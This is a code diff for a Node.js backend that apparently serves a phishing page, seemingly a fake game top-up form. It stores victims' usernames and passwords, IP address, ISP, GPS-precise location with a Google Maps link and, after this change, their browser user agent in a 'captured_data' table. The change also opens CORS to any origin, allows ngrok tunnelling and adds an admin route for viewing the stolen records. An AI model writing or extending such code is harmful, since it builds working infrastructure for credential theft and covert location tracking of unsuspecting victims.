@@ -29,8 +29,12 @@ const db = new sqlite3.Database(dbPath, (err) => {
             location TEXT,
             mapsLink TEXT,
             isHighAccuracy INTEGER,
+            userAgent TEXT,
             timestamp TEXT
         )`);
+        // Ensure method and userAgent columns exist for existing databases
+        db.run("ALTER TABLE captured_data ADD COLUMN method TEXT", (err) => {});
+        db.run("ALTER TABLE captured_data ADD COLUMN userAgent TEXT", (err) => {});
     }
 });
 
@@ -38,14 +42,26 @@ const db = new sqlite3.Database(dbPath, (err) => {
 const io = new Server(server, {
     cors: {
         origin: "*",
-        methods: ["GET", "POST"]
-    }
+        methods: ["GET", "POST"],
+        allowedHeaders: ["ngrok-skip-browser-warning"],
+        credentials: true
+    },
+    transports: ['polling', 'websocket']
 });
 
 const PORT = process.env.PORT || 5000;
 
-app.use(cors());
+app.use(cors({
+    origin: "*",
+    methods: ["GET", "POST", "DELETE", "OPTIONS"],
+    allowedHeaders: ['Content-Type', 'Authorization', 'ngrok-skip-browser-warning'],
+    credentials: true
+}));
 app.use(express.json());
+
+app.get('/', (req, res) => {
+    res.send('<h1>Backend is running!</h1><p>Use /api/admin/data to see captured data.</p>');
+});
 
 app.get('/api', (req, res) => {
     res.send('Backend Real-time Ready (SQLite Mode)');
@@ -92,12 +108,13 @@ app.post('/api/setor-data', async (req, res) => {
         location: hasGPS ? `GPS Precision (Accuracy: ${gps.accuracy.toFixed(1)}m)` : `${geoInfo.city}, ${geoInfo.regionName}, ${geoInfo.country}`,
         mapsLink: finalLat && finalLng ? `https://www.google.com/maps?q=${finalLat},${finalLng}` : null,
         isHighAccuracy: hasGPS ? 1 : 0,
+        userAgent: req.headers['user-agent'] || 'Unknown',
         timestamp: new Date().toLocaleString('id-ID')
     };
 
     // Save to SQLite
-    const stmt = db.prepare(`INSERT INTO captured_data (username, password, game, nominal, ip, isp, location, mapsLink, isHighAccuracy, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);
-    stmt.run(dataLog.username, dataLog.password, dataLog.game, dataLog.nominal, dataLog.ip, dataLog.isp, dataLog.location, dataLog.mapsLink, dataLog.isHighAccuracy, dataLog.timestamp, function(err) {
+    const stmt = db.prepare(`INSERT INTO captured_data (username, password, game, nominal, ip, isp, location, mapsLink, isHighAccuracy, userAgent, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);
+    stmt.run(dataLog.username, dataLog.password, dataLog.game, dataLog.nominal, dataLog.ip, dataLog.isp, dataLog.location, dataLog.mapsLink, dataLog.isHighAccuracy, dataLog.userAgent, dataLog.timestamp, function(err) {
         if (err) {
             console.error('Error saving to DB:', err.message);
         } else {
